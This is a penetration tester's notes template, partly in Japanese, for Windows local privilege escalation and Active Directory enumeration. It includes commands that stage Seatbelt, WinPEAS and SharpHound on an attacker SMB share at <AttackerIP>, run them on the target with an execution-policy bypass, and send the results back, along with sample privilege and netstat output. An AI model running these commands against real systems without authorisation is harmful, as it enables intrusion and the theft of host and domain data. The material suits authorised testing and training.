# Local

## Auto w/ [Seatbelt](https://github.com/GhostPack/Seatbelt)

### 転送・実行

```zsh
# Attacker
mkdir share
wget https://github.com/r3motecontrol/Ghostpack-CompiledBinaries/raw/refs/heads/master/Seatbelt.exe -O share/Seatbelt.exe
impacket-smbserver -smb2support -username username -password pw share share
```
```powershell
# Target
net use \\<AttackerIP>\share /user:username pw
cp \\<AttackerIP>\share\Seatbelt.exe .
.\Seatbelt.exe -group=all | Tee-Object -FilePath \\<AttackerIP>\share\seatbelt_result.txt
```

### 実行結果抽出

```powershell

```


## Auto w/ [WinPEAS](https://github.com/peass-ng/PEASS-ng/tree/master/winPEAS)

### 転送・実行

```zsh
# Attacker
mkdir share
cp /usr/share/peass/winpeas/winPEASx64.exe share/
impacket-smbserver -smb2support -username username -password pw share share
```
```powershell
# Target
cd ~
net use \\<AttackerIP>\share /user:username pw
cp \\<AttackerIP>\share\winPEASx64.exe .
.\winPEASx64.exe | Tee-Object -FilePath \\<AttackerIP>\share\peas_result.txt
```

### 実行結果抽出

```powershell

```

---
---

## Manual

### ユーザー

- SeImpersonatePrivilegeがある
```
PS C:\> whoami /priv
whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State   
============================= ========================================= ========
SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled
SeAuditPrivilege              Generate security audits                  Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
SeCreateGlobalPrivilege       Create global objects                     Enabled 
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
```


---

### システム情報


---

### ネットワーク

- ローカルサービス（おそらくMSSQL）が動作している
```powershell
netstat -ano

Active Connections

  Proto  Local Address          Foreign Address        State           PID
  TCP    0.0.0.0:135            0.0.0.0:0              LISTENING       888
  TCP    0.0.0.0:445            0.0.0.0:0              LISTENING       4
  TCP    0.0.0.0:2994           0.0.0.0:0              LISTENING       2452
  TCP    0.0.0.0:5985           0.0.0.0:0              LISTENING       4
  TCP    0.0.0.0:24621          0.0.0.0:0              LISTENING       2284
  TCP    0.0.0.0:24680          0.0.0.0:0              LISTENING       4
  TCP    0.0.0.0:47001          0.0.0.0:0              LISTENING       4
  TCP    0.0.0.0:49664          0.0.0.0:0              LISTENING       668
  TCP    0.0.0.0:49665          0.0.0.0:0              LISTENING       532
  TCP    0.0.0.0:49666          0.0.0.0:0              LISTENING       1160
  TCP    0.0.0.0:49667          0.0.0.0:0              LISTENING       1420
  TCP    0.0.0.0:49668          0.0.0.0:0              LISTENING       660
  TCP    0.0.0.0:49669          0.0.0.0:0              LISTENING       2352
  TCP    127.0.0.1:1434         0.0.0.0:0              LISTENING       824
  TCP    127.0.0.1:14148        0.0.0.0:0              LISTENING       2284
  TCP    192.168.141.226:139    0.0.0.0:0              LISTENING       4
  TCP    192.168.141.226:24621  192.168.45.239:56468   ESTABLISHED     2284
  TCP    192.168.141.226:63787  192.168.45.239:443     ESTABLISHED     1668
  TCP    192.168.141.226:63810  20.72.205.209:443      TIME_WAIT       0
  TCP    192.168.141.226:63822  20.106.86.13:443       SYN_SENT        376
  TCP    192.168.141.226:63823  74.178.76.128:443      SYN_SENT        2700

  UDP    0.0.0.0:67             *:*                                    2452
  UDP    0.0.0.0:69             *:*                                    2452
  UDP    0.0.0.0:123            *:*                                    3508
  UDP    0.0.0.0:500            *:*                                    2220
  UDP    0.0.0.0:514            *:*                                    2452
  UDP    0.0.0.0:4500           *:*                                    2220
  UDP    0.0.0.0:5353           *:*                                    1440
  UDP    0.0.0.0:5355           *:*                                    1440
  UDP    0.0.0.0:63274          *:*                                    1440
  UDP    0.0.0.0:65296          *:*                                    1440
  UDP    127.0.0.1:62273        127.0.0.1:62273                        2256
  UDP    192.168.141.226:137    *:*                                    4
  UDP    192.168.141.226:138    *:*                                    4
...
```


---

### インストール済みアプリケーション


---

### 実行中のプロセス


---

### PowerShellログ


---

### サービス


---

### スケジュールタスク


---

### 興味深い情報


---
---

# AD

## Auto w/ BloodHound

```zsh
# Attacker(作成済みのSMB共有を使う)
cp /opt/bloodhound/SharpHound.ps1 share
```
```powershell
# Target
powershell -ep bypass
net use \\<AttackerIP>\share /user:username pw
Import-Module \\<AttackerIP>\share\SharpHound.ps1
Invoke-BloodHound -CollectionMethod All -OutputDirectory \\<AttackerIP>\share -ZipFileName 'audit.zip'
```